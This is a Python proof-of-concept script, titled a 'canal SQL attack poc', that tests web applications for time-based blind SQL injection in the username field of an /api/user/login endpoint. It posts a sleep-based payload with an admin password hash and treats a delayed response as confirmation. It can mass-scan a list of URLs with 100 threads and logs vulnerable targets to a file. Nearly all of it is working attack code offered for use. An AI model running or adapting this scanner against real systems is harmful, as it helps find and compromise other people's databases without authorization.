import requests, argparse, re, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

 ██░ ██  █     █░     ██████   █████   ██▓        ▄▄▄▄ ▓██   ██▓    ██▓███   ██▓▓█████ 
▓██░ ██▒▓█░ █ ░█░   ▒██    ▒ ▒██▓  ██▒▓██▒       ▓█████▄▒██  ██▒   ▓██░  ██▒▓██▒▓█   ▀ 
▒██▀▀██░▒█░ █ ░█    ░ ▓██▄   ▒██▒  ██░▒██░       ▒██▒ ▄██▒██ ██░   ▓██░ ██▓▒▒██▒▒███   
░▓█ ░██ ░█░ █ ░█      ▒   ██▒░██  █▀ ░▒██░       ▒██░█▀  ░ ▐██▓░   ▒██▄█▓▒ ▒░██░▒▓█  ▄ 
░▓█▒░██▓░░██▒██▓    ▒██████▒▒░▒███▒█▄ ░██████▒   ░▓█  ▀█▓░ ██▒▓░   ▒██▒ ░  ░░██░░▒████▒
 ▒ ░░▒░▒░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░   ░▒▓███▀▒ ██▒▒▒    ▒▓▒░ ░  ░░▓  ░░ ▒░ ░
 ▒ ░▒░ ░  ▒ ░ ░     ░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░   ▒░▒   ░▓██ ░▒░    ░▒ ░      ▒ ░ ░ ░  ░
 ░  ░░ ░  ░   ░     ░  ░  ░     ░   ░   ░ ░       ░    ░▒ ▒ ░░     ░░        ▒ ░   ░   
 ░  ░  ░    ░             ░      ░        ░  ░    ░     ░ ░                  ░     ░  ░
                                                       ░░ ░                            

                                                                @author: black apple pie
                                                                @version: 0.0.1
"""
    print(banner)

#poc
def poc(target):
    url = target + "/api/user/login"
    headers = {
        "Content-Length": "102",
        "Sec-Ch-Ua": '"Chromium";v="91", " Not;A Brand";v="99"',
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }

    data = {
        "captcha":"",
        "password":"21232f297a57a5a743894a0e4a801fc3",
        "username":"admin'and(select*from(select+sleep(3))a)='"
    }

    res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
    try:
        if res.elapsed.total_seconds() > 3:
            print("[+]" + target + "存在SQL注入")
            with open('sql.txt', 'a', encoding='utf-8') as f:
                f.write(target + "存在SQL注入\n")
        else:
            print("[-]" + target + "不存在SQL注入")
    except Exception as e:
        print(e)

#main
def main():
    banner()

    parser = argparse.ArgumentParser(description='this is a canal SQL attack poc')

    #添加参数，-u（单个检测），-f（批量检测）
    parser.add_argument('-u', '--url', dest='url', help='input attack url', type=str)
    parser.add_argument('-f', '--file', dest='file', help='url.txt', type=str)

    #调用
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



#调用
if __name__ == '__main__':
    main()